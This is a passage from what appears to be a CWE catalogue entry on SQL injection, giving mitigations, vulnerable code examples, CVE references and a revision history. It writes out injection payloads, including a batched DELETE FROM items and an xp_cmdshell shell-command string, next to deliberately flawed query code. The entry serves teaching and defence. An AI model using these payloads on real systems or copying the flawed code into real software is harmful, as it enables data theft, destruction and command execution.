                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name "O'Reilly" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the "'" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.</xhtml:p>
                  <xhtml:p>When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                  <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
                  <xhtml:p>In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-209">
               <Intro_Text>The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.</Intro_Text>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>...<xhtml:br/>string userName = ctx.getAuthenticatedUserName();<xhtml:br/>string query = "SELECT * FROM items WHERE owner = '" + userName + "' AND itemname = '" + ItemName.Text + "'";<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>DataTable dt = new DataTable();<xhtml:br/>sda.Fill(dt);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The query that this code intends to execute follows:</Body_Text>
               <Example_Code Nature="Informative">
                  <xhtml:div>SELECT * FROM items WHERE owner = &lt;userName&gt; AND itemname = &lt;itemName&gt;;</xhtml:div>
               </Example_Code>
               <Body_Text>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>name' OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>The addition of the:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>SELECT * FROM items;</xhtml:div>
               </Example_Code>
               <Body_Text>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example.</Intro_Text>
               <Body_Text>If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>name'; DELETE FROM items; --</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following two queries:</Body_Text>
               <Example_Code Nature="Attack" Language="SQL">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:br/>
                     <xhtml:i>--'</xhtml:i>
                     <xhtml:br/>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.</Body_Text>
               <Body_Text>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example.</Body_Text>
               <Body_Text>If an attacker enters the string</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>Then the following three valid statements will be created:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:br/>SELECT * FROM items WHERE 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allowlist of safe values or identify and escape a denylist of potentially malicious values. Allowlists can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, denylisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>Target fields that are not quoted</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Find ways to bypass the need for certain escaped meta-characters</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Use stored procedures to hide the injected meta-characters.</xhtml:div>
                     </xhtml:li>
                  </xhtml:ul>
               </Body_Text>
               <Body_Text>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.</Body_Text>
               <Body_Text>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example.</Body_Text>
               <Example_Code Nature="Bad">
                  <xhtml:div>procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)<xhtml:br/>is open itm_cv for<xhtml:br/>' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';<xhtml:br/>end get_item;</xhtml:div>
               </Example_Code>
               <Body_Text>Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:</Intro_Text>
               <Example_Code Nature="Bad">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Where $user_input is taken from an untrusted source.</Body_Text>
               <Body_Text>If the user provides the string:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>'; exec master..xp_cmdshell 'dir' --</xhtml:div>
               </Example_Code>
               <Body_Text>The query will take the following form:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Now, this query can be broken down into:</Body_Text>
               <Body_Text>
                  <xhtml:ol>
                     <xhtml:li>
                        <xhtml:div>a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>an MS SQL comment: --' ORDER BY PRICE</xhtml:div>
                     </xhtml:li>
                  </xhtml:ol>
               </Body_Text>
               <Body_Text>As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code intends to print a message summary given the message ID.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$id = $_COOKIE["mid"];<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser.</Body_Text>
               <Body_Text>While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>1432' or '1' = '1</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the resulting query:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'</xhtml:div>
               </Example_Code>
               <Body_Text>Not only will this retrieve message number 1432, it will retrieve all other messages.</Body_Text>
               <Body_Text>In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection:</Body_Text>
               <Example_Code Nature="Good" Language="PHP">
                  <xhtml:div>$id = intval($_COOKIE["mid"]);<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example attempts to take a last name provided by a user and enter it into a database.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>$userKey = getUserID();<xhtml:br/>$name = getUserInput();<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># ensure only letters, hyphens and apostrophe are allowed</xhtml:i>
                     <xhtml:br/>$name = allowList($name, "^a-zA-z'-$");<xhtml:br/>$query = "INSERT INTO last_names VALUES('$userKey', '$name')";</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer applies an allowlist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens, which are used as comment structures in SQL. If a user specifies "--" then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the allowlist permits the apostrophe, which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2023-32530</Reference>
               <Description>SQL injection in security product dashboard using crafted certificate fields</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2023-32530</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-42258</Reference>
               <Description>SQL injection in time and billing software, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-42258</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-27101</Reference>
               <Description>SQL injection in file-transfer system via a crafted Host header, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-27101</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-12271</Reference>
               <Description>SQL injection in firewall product's admin interface or user portal, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-12271</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-3792</Reference>
               <Description>An automation system written in Go contains an API that is vulnerable to SQL injection allowing the attacker to read privileged data.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-3792</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0366</Reference>
               <Description>chain: SQL injection in library intended for database authentication allows SQL injection and authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0366</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2790</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2790</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2223</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2223</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6602</Reference>
               <Description>SQL injection via user name.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6602</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5817</Reference>
               <Description>SQL injection via user name or password fields.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5817</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0377</Reference>
               <Description>SQL injection in security product, using a crafted group name.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0377</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2380</Reference>
               <Description>SQL injection in authentication library.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2380</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-11508</Reference>
               <Description>SQL injection in vulnerability management and reporting tool, using a crafted password.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-11508</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>SQL injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>SQL Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>SQL injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>19</Entry_ID>
               <Entry_Name>SQL Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-89</Entry_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Oracle Coding Standard for Java">
               <Entry_ID>IDS00-J</Entry_ID>
               <Entry_Name>Prevent SQL injection</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="109"/>
            <Related_Attack_Pattern CAPEC_ID="110"/>
            <Related_Attack_Pattern CAPEC_ID="470"/>
            <Related_Attack_Pattern CAPEC_ID="66"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 1: SQL Injection.&#34; Page 3"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 12, &#34;Database Input Issues&#34; Page 397"/>
            <Reference External_Reference_ID="REF-867"/>
            <Reference External_Reference_ID="REF-868"/>
            <Reference External_Reference_ID="REF-869"/>
            <Reference External_Reference_ID="REF-870"/>
            <Reference External_Reference_ID="REF-871"/>
            <Reference External_Reference_ID="REF-872"/>
            <Reference External_Reference_ID="REF-873"/>
            <Reference External_Reference_ID="REF-874"/>
            <Reference External_Reference_ID="REF-875"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;SQL Queries&#34;, Page 431"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;SQL Injection&#34;, Page 1061"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-89"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">SQL injection can be resultant from special character mismanagement, MAID, or denylist/allowlist problems. It can be primary to authentication errors.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
			   <Modification_Version>1.0</Modification_Version>
			   <Modification_ReleaseDate>2008-09-09</Modification_ReleaseDate>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
			   <Modification_Version>1.0</Modification_Version>
			   <Modification_ReleaseDate>2008-09-09</Modification_ReleaseDate>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
			   <Modification_Version>1.0</Modification_Version>
			   <Modification_ReleaseDate>2008-09-09</Modification_ReleaseDate>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Modes_of_Introduction, Name, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Name, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Name, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, Modes_of_Introduction, Observed_Examples, References, Relationships, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
